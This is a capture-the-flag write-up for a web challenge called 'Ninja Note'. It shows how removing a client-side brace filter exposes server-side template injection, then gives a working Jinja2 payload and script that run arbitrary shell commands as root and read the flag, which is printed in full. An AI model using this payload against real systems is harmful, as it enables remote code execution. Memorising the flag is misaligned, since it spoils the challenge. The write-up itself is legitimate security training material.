# Ninja Note

## Description

We were told there was a web vulnerability in our website, so we made it into a CLI! That should fix it, right?

[client.py](https://ctf.uscybergames.com/files/8d4f65bdc182a8279994db7f905c9e31/client.py?token=eyJ1c2VyX2lkIjoxMDY4LCJ0ZWFtX2lkIjpudWxsLCJmaWxlX2lkIjoxM30.aEmoNA.ICZe-7c5Y8PJJAzQqoNibaH_sT4)

## Solution

`client.py`:
```python
from requests import get, post

BASE_URL = "http://localhost:8080"

def get_path(path):
    return get(BASE_URL + path, headers={"User-Agent": "NinjaNote 13.37"})

def post_path(path, data):
    return post(BASE_URL + path, headers={"User-Agent": "NinjaNote 13.37"}, json=data)

print("Welcome to NinjaNote!\n\nVersion: 13.37\n\n")

while True:
    primary_selection = ""
    while primary_selection not in ["1", "2", "3"]:
        print("What do you want to do?\n[1] Create note\n[2] Search note\n[3] Exit")
        primary_selection = input("Your selection: ")
        if primary_selection not in ["1", "2", "3"]:
            print("Invalid selection. Try again.")
        print("\n")
    if primary_selection == "1":
        print("Creating new note")
        title = input("Title: ")
        # Hopefully this should be enough?
        note_content = input("Note content: ").replace("{", "").replace("}", "")
        res = post_path("/api/submit", {"title": title, "content": note_content}).json()
        if 'note_id' in res:
            print("Success! Your note ID is: " + res['note_id'])
        else:
            print("Error in posting your note: ", res)
    elif primary_selection == "2":
        print("Retrieving note")
        note_id = input("Note ID to retrieve: ")
        print(get_path("/api/notes/" + note_id).text)
    else:
        break
    print("\n")
```

To interact with the endpoint we were provided with `client.py`, but it has a restriction of `replace` curly braces, remove the restriction and run the client.

```powershell
➜ py .\ctf\client.py
Welcome to NinjaNote!
Creating new note
Title: {{request}}
Note content: {{request}}
Success! Your note ID is: d8f011c1-3415-406f-9688-50ec2c184e26

Note ID to retrieve: d8f011c1-3415-406f-9688-50ec2c184e26
Note ID: d8f011c1-3415-406f-9688-50ec2c184e26
Title: {{request}}
Note: &lt;Request &#39;http://xkzcxatz.web.ctf.uscybergames.com/api/notes/d8f011c1-3415-406f-9688-50ec2c184e26&#39; [GET]&gt;
```

SSTI identified.

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md)

Make it simpler:
```python
from requests import Session

URL = "https://dllgpety.web.ctf.uscybergames.com/"

with Session() as session:
    while True:
        session.headers.update({"User-Agent": "NinjaNote 13.37"})

        resp = session.post(f'{URL}/api/submit', json={
            "title": "x", 
            "content": "{{ cycler.__init__.__globals__.os.popen('%s').read() }}" % input("Cmd: ") 
        })
        resp = session.get(f'{URL}/api/notes/{resp.json()["note_id"]}')
        print(resp.text)
```

```powershell
➜ py .\ctf\t.py
Cmd: id
Note ID: 7a1096f7-5cb2-4e9d-98ae-c6926f9c7b02
Title: x
Note: uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)

Cmd: cat /flag.txt
Note ID: f56885fc-3718-4626-a8a2-afa61217f0f8
Title: x
Note: SVBGR{y0u_4r3_4n_API_h4ck1ng_n1nj4!}  
```

::: tip Flag
`SVBGR{y0u_4r3_4n_API_h4ck1ng_n1nj4!}`
:::

